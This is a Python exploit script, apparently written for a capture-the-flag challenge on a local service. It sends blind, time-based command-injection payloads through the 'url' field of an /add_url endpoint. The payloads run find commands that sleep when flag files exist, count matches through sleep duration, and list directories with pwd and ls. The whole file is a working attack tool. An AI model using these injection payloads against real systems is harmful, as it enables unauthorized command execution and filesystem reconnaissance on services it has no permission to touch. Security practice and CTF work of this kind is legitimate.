import requests
import time

base_url = "http://127.0.0.1:32998"
add_url = f"{base_url}/add_url"

print("="*60)
print("EXTENSIVE FILESYSTEM ENUMERATION FOR FLAG FILES")
print("="*60)

# Use find with -exec to test each file found
# If we find any file, sleep to signal

print("\n[*] Searching entire filesystem for flag* files...")

# Search for files with flag in name and cause delay if found
search_payloads = [
    # Find flag files and sleep if any exist
    ("find / -name 'flag*' -type f -exec sleep 3 \; 2>/dev/null", "Find flag* files"),
    ("find / -name 'FLAG*' -type f -exec sleep 3 \; 2>/dev/null", "Find FLAG* files"),
    ("find / -name '*.flag' -type f -exec sleep 3 \; 2>/dev/null", "Find *.flag files"),
    ("find / -name 'fl4g*' -type f -exec sleep 3 \; 2>/dev/null", "Find fl4g* files"),
    ("find / -name 'f14g*' -type f -exec sleep 3 \; 2>/dev/null", "Find f14g* files"),
]

for payload, desc in search_payloads:
    print(f"\n[*] {desc}...")
    start = time.time()
    try:
        resp = requests.post(add_url, data={"url": payload}, timeout=15)
        elapsed = time.time() - start
        if elapsed > 2.5:
            print(f"    [!] FILES FOUND! Search took {elapsed:.2f}s")
        else:
            print(f"    [-] No files found ({elapsed:.2f}s)")
    except Exception as e:
        elapsed = time.time() - start
        if elapsed > 2.5:
            print(f"    [!] FILES FOUND (timeout after {elapsed:.2f}s)")
        else:
            print(f"    [!] Error: {e}")

# Also try to count files and see if we get any
print("\n[*] Counting flag files...")
count_payload = "flag_count=$(find / -name 'flag*' -type f 2>/dev/null | wc -l); [ $flag_count -gt 0 ] && sleep $flag_count"
start = time.time()
try:
    resp = requests.post(add_url, data={"url": count_payload}, timeout=15)
    elapsed = time.time() - start
    if elapsed > 0.5:
        flag_count = int(elapsed)
        print(f"    [!] Found approximately {flag_count} flag file(s)")
    else:
        print(f"    [-] No flag files found ({elapsed:.2f}s)")
except Exception as e:
    elapsed = time.time() - start
    if elapsed > 0.5:
        print(f"    [!] Time delay detected: {elapsed:.2f}s")

# Check current working directory and parent
print("\n[*] Checking working directory and parents...")
pwd_payloads = [
    ("pwd", "Get current directory"),
    ("ls -la", "List current directory"),
    ("ls -la /", "List root directory"),
    ("ls -la ..", "List parent directory"),
    ("ls -la ../..", "List grandparent directory"),
]

for payload, desc in pwd_payloads:
    print(f"\n[*] {desc}...")
    start = time.time()
    try:
        resp = requests.post(add_url, data={"url": payload}, timeout=10)
        elapsed = time.time() - start
        print(f"    Response: {resp.text[:100]}")
    except Exception as e:
        print(f"    Error: {e}")

